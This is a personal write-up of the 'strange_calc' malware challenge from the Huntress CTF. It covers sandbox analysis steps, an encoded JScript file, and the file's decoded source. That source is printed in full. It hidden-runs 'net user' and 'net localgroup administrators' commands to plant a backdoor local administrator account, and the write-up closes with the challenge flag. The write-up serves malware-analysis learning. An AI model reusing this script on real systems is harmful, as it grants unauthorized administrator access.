2024-11-13 07:45

Status: #completed_huntress_CTF

Tags: [[huntressctf]] [[solved]] [[malware]] [[obfuscation]] [[ctf]] [[Cyber Security]] [[cyber security awareness month]] 

# strange_calc
Side Note from Future Cory: This was the very first challenge of the CTF, and reading this back, I learned a lot from how much I over complicated this. The other challenges had much better flow, and I felt like I had a better understanding, of what I am looking for, and where I should be looking.

Strange Calc is malware challenge for the first day of the Huntress CTF. This challenge isn't overly complicated, but I made it harder than it needed to be, though for this being my first official CTF I'm not bothered by how I made it more complex. 
We start by prepping the file onto our Malware Analysis VM
1. Enable SSH on our kali and Malware Analysis VM
2. Move the file from the kali VM to the malware Analysis VM
3. Extract the contents of the 7z archive with the password strange_calc
Now that our file is staged and ready to go, lets take a snapshot of our VM to ensure we can recover back to where we were in the event we need to. 
4. Take snapshot of VM
5. We'll start with the basics, and run strings on the .exe 
Strings didn't really give us anything of use, so we can move on, next we can run Detect it Easy and see that this file is packed with UPX, we could unpack this if we feel that disassembly is necessary, but I am really bad with reverse engineering so lets see what we can figure out without having to do that.
6. Ran Detect it Easy
From this point we don't know much about the executable, but we took a snapshot already so lets see what happens when we run it. 
Before running the [[Malware]] I am going to run [[RegShot]] to take an initial backup of the registry, and then run [[Process Explorer]] and [[Process Monitor]] 
7. Start up Regshot and take 1st shot of the Registry
8. Start up Process Explorer and Process Monitor
9. Filter Process Monitor to look for things done by our calc.exe 
Now that we have done all of this lets run this application.
When we run the calc.exe as administrator, it states that it failed to open the calculator and creates a .jse file with an odd name. It looks like the application also created a new user labeled Administrator on the system that's kind of neat. 
Since a user was created I first changed that user's password and logged into just to see if maybe this specific user could run the calc.exe program. 

After messing around with this newly created user and finding that it's just a blank empty new account, didn't create any files on this user's profile or anything I decided to go back and look at the javascript file that was created.

```#@~^cQMAAA==W!x^DkKxPm`(b	7l.P1'EEBN'( /aVkDcE-	J*iWW.c7l.Px!p+@![cV+ULDtI+3Q*	-mD,0'9$DRM+2VmmncJ7-kQu'/_f&L~EB*ir0cWckUNar6`E8okUE*'x'Zk-0 bx9+6}0vE+	NE#{'xT-u0{x'rJ#1GUYbx!+I\C.,ox`6 m4l./KN+)Ov!bO2+*[2i6WDv\m.P4'qi4@!W ^+xTOtpt_{*b	b0vtQ&@*x6Rs+	LY4#8.l3I-mD~k{c6R^4lMZW9+zO`4#R&y#'2~L{c0cmtm./W9+zYctQq*Of *'v2~Vxv0R^4mD/W9nzYc4_y#O2 *'v2~s'v0 ^4lD;GNbYv4Q&*O2 b[fpmQ'UODbxL 6DWh/4l.ZK[`cb@!@! #-`N@*@*W#bib0c43 @!6 VxoD4RF*m3'jY.r	o 0MG:;tC.;WNncv`%[8X*@!@!W#-`3@*@*yb#pkW`4_f@!6RVUoDtO8b^_{?DDrxL 6DG:;4lMZG[``cVL&b@!@!*us*8)D+DEMUP1RdE(/O.bxovT~T#87C.Ps'r4norU,v*c,R-	M1o5b,	JIRf`"1w`]Bvub,;^qR&{2S.Of0/v(,[@!(c&"zR!I~qKM-U|'xnx9Ei7l.~	'lch*i-lM~K',rxYP!/.PdW^l^b[hbxkkODmYWM~E_	_rP&l[[r~ExOP^W^C^oDG;aPCNsr	kdDDmYWM/,JW1lsb9:rUb/YMCYKDPJC[Nr~rmCV^ 6nJYI\mD~2{x+A~zmOk7nor8N+1Y`EU^DbwORUtns^B#pWWM`\m.~;{!p;@!W sxLY4RFp;QQ*	w ]!xcW]5Y~TB0mV/#)2R"EU`K$+DBF~6CVk+#p4RABAA==^#~@```

This file looks like gibberish but that makes some sense since it is encrypted. So lets copy that entire jse into [[CyberChef]] and see if that detects anything about the file. 

It almost immediately says we can decode this with Microsoft Script Decoder so let's see what it looks like after decoding 

```function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);```

This script is pretty interesting, it does some deobfuscation and then we can see that it does create a new local Administrator which we did notice prior. 
The important looking piece to me is that variable m
We could tear down the rest of the script and see how it manipulates the variable m
Though the start piece of begin 644 is an indicator that this is using [[UUencoding]]
So lets throw that variable in CyberChef and bake it using From [[Base64]] change the alphabet to UUencoding and deselect the box to remove non-alphabet characters
This will give us our flag.
```flag{9922fb21aaf1757e3fdb28d7890a5d93}```
## Keywords


# Resources

# References
